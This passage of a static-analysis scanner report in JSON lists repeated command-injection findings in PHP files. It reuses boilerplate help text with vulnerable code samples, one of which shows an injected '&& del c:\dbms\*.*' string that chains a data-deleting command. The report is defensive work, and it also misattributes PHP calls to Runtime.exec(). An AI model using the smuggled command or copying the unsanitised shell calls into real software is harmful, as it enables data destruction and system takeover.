a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4363/?engineType=SCA&issue=0134698E68A636B4A60DA2421F7B1B6F"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4614",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 22 in impossible.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in impossible.php on line 22.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4614/?engineType=SCA&issue=9BA05608F56D1F8EB783DB5A96E6235D"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4445",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 26 in impossible.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in impossible.php on line 26.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4445/?engineType=SCA&issue=346DB04AC4267C5B5533E332E92F38F4"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4402",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 10 in low.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in low.php on line 10.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4402/?engineType=SCA&issue=19C105429F747FA4C50C1D57F308AA65"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4690",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 14 in low.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in low.php on line 14.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4690/?engineType=SCA&issue=DAA05755644C6015A0AEFE1173CADE81"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4655",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 19 in medium.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in medium.php on line 19.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks to verify the identity of the binary. If a binary should always be owned by a particular user or have a particular set of access permissions assigned to it, these properties can be verified programmatically before the binary is executed.\n\nAlthough it may be impossible to completely protect a program from an imaginative attacker bent on controlling the commands the program executes, be sure to apply the principle of least privilege wherever the program executes an external command: do not hold privileges that are not essential to the execution of the command.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4655/?engineType=SCA&issue=C0CD46ECE8DAD80BBD5B182CEF2344D2"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4440",
          "shortDescription" : {
            "text" : "Command Injection"
          },
          "fullDescription" : {
            "text" : "Line 23 in medium.php calls shell_exec() with a command built from untrusted data. This call can cause the program to execute malicious commands on behalf of an attacker.\n\n\n"
          },
          "help" : {
            "text" : "Command injection vulnerabilities take two forms:\n\n- An attacker can change the command that the program executes: the attacker explicitly controls what the command is.\n\n- An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means.\n\nIn this case, we are primarily concerned with the first scenario, the possibility that an attacker may be able to control the command that is executed. Command injection vulnerabilities of this type occur when:\n\n1. Data enters the application from an untrusted source.\n\n\n2. The data is used as or as part of a string representing a command that is executed by the application.\n\nIn this case, the command is executed by shell_exec() in medium.php on line 23.\n\n3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.\n\nExample 1: The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.\n\n\n\t...\n\t$home = $_ENV['APPHOME'];\n\t$cmd = $home . $INITCMD;\n\tsystem(cmd);\n\t...\n\n\nThe code in Example 1 allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system.\n\nExample 2: The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies the type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.\n\n\n...\n$btype = $_GET['backuptype'];\n$cmd = \"cmd.exe /K \\\"c:\\\\util\\\\rmanDB.bat \" . $btype . \"&amp;&amp;c:\\\\util\\\\cleanup.bat\\\"\";\nsystem(cmd);\n...\n\n\nThe problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). After the shell is invoked, it will allow for the execution of multiple commands separated by two ampersands. If an attacker passes a string of the form \"&amp;&amp; del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well.\n\nExample 3: The following code is from a web application that provides an interface through which users can update their password on the system. Part of the process for updating passwords in certain network environments is to run a make command in the /var/yp directory.\n\n\n...\n$result = shell_exec(\"make\");\n...\n\n\nThe problem here is that the program does not specify an absolute path for make and fails to clean its environment prior to executing the call to Runtime.exec(). If an attacker can modify the $PATH variable to point to a malicious binary called make and cause the program to be executed in their environment, then the malicious binary will be loaded instead of the one intended. Because of the nature of the application, it runs with the privileges necessary to perform system operations, which means the attacker's make will now be run with these privileges, possibly giving the attacker complete control of the system.\n\nDo not allow users to have direct control over the commands executed by the program. In cases where user input must affect the command to be run, use the input only to make a selection from a predetermined set of safe commands. If the input appears to be malicious, the value passed to the command execution function should either default to some safe selection from this set or the program should decline to execute any command at all.\n\nIn cases where user input must be used as an argument to a command executed by the program, this approach often becomes impractical because the set of legitimate argument values is too large or too hard to keep track of. Developers often fall back on implementing a deny list in these situations. A deny list is used to selectively reject or escape potentially dangerous characters before using the input. Any list of unsafe characters is likely to be incomplete and will be heavily dependent on the system where the commands are executed. A better approach is to create a list of characters that are permitted to appear in the input and accept input composed exclusively of characters in the approved set.\n\nAn attacker may indirectly control commands executed by a program by modifying the environment in which they are executed. The environment should not be trusted and precautions should be taken to prevent an attacker from using some manipulation of the environment to perform an attack. Whenever possible, commands should be controlled by the application and executed using an absolute path. In cases where the path is not known at compile time, such as for cross-platform applications, an absolute path should be constructed from trusted values during execution. Command values and paths read from configuration files or the environment should be sanity-checked against a set of invariants that define valid values.\n\nOther checks can sometimes be performed to detect if these sources may have been tampered with. For example, if a configuration file is world-writable, the program might refuse to run. In cases where information about the binary to be executed is known in advance, the program may perform checks 